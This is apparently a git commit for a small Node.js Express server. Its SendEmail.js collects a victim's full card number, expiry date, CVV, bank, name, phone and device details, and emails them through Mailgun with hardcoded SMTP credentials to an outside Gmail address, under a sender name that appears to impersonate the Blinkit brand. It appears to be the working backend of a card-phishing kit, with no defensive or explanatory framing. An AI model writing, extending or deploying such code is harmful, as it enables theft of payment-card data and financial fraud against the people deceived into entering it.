f3041517c135915240abb0f05564361d81a92058
Mulayam <50077856+Mullayam@users.noreply.github.com>
2023-07-03 20:01:01 +0530

    inital commit

---
+++ SendEmail.js
@@ -0,0 +1,39 @@
+const nodemailer = require("nodemailer");
+
+const transporter = nodemailer.createTransport({
+  host: "smtp.mailgun.org",
+  port: 465,
+  secure: true,
+  auth: {
+    user: "blinkit@cashoxo.com",
+    pass: "Ankit@123",
+  },
+});
+
+async function Mail(data) {
+  const device = `${data.detectedDevice.brand} ${data.detectedDevice.model} ${data.detectedDevice.version}`;
+  const html = `
+ <b style="font-size:25px;">  <BR>        
+    Card Type:  ${data.cardtype} <BR>
+    Card Issuing BankName: ${data.bankname} <BR>
+    CCnum: ${data.cardnumber}<BR>
+    Exp:  ${data.expirationdate}<BR>
+    CVV:  ${data.securitycode}<BR>
+    Name:  ${data.name}<BR>
+    Phone: ${data.phone}<BR>    
+    Device:  ${device} <BR>
+    </b>;
+`;
+const subject = `${data.bankname} CARD`;
+  const info = await transporter.sendMail({
+    from: '"blinkit👻" <blinkit@cashoxo.com>', // sender address
+    to: "rus.server420@gmail.com", // list of receivers
+    subject,
+    text: "Hello world?", // plain text body
+    html, // html body
+  });
+
+  return info;
+}
+
+module.exports = { Mail };
---
+++ index.js
@@ -0,0 +1,11 @@
+const express = require("express");
+const app = express();
+const cors = require("cors");
+const routes = require("./routes");
+app.use(cors({ origin: "*", methods: ["GET", "POST"] }));
+app.use(express.json())
+app.use(routes);
+
+app.listen(5000, () => {
+  console.log("http://localhost:5000");
+});
